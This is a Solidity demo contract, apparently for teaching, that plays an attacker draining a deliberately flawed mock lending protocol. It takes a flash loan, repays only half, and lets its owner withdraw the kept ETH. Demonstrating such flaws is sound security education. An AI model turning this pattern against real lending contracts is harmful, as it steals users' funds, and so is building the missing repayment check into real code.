// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./MockLendingProtocol.sol";
import "./IFlashLoanReceiver.sol";

// Simulates an attacker who takes a flash loan and keeps part of the funds.
// The lender in this demo does NOT enforce repayment, making the attack possible.
contract FlashLoanAttacker is IFlashLoanReceiver {
    address payable public owner;
    MockLendingProtocol public lender;

    // Event to log how much profit the attacker made
    event ProfitMade(uint256 amount);

    // Constructor saves the lender's contract address
    constructor(address payable _lender) {
        owner = payable(msg.sender);
        lender = MockLendingProtocol(_lender);
    }

    // Initiates the flash loan attack by asking the lender to send ETH
    function startAttack(uint256 loanAmount) public {
        lender.provideFlashLoan(loanAmount, address(this));
    }

    // Called by the lender after sending the ETH.
    // The attacker receives the loan, repays only part, and keeps the rest.
    function execute() external payable override {
        uint256 loanAmount = msg.value;

        // Attacker chooses to keep 50% of the loan
        uint256 profit = loanAmount / 2;

        // Only return part of the loan to the lender (no check means this works)
        payable(address(lender)).transfer(loanAmount - profit);

        // Log how much ETH was kept by the attacker
        emit ProfitMade(profit);
    }

    // View function to check how much ETH the attacker has
    function getAttackerBalance() public view returns (uint256) {
        return address(this).balance;
    }

    // Allows the contract owner to withdraw stolen funds
    function withdraw() public {
        require(msg.sender == owner, "Only owner");
        owner.transfer(address(this).balance);
    }

    // Allows the contract to receive ETH
    receive() external payable {}
}

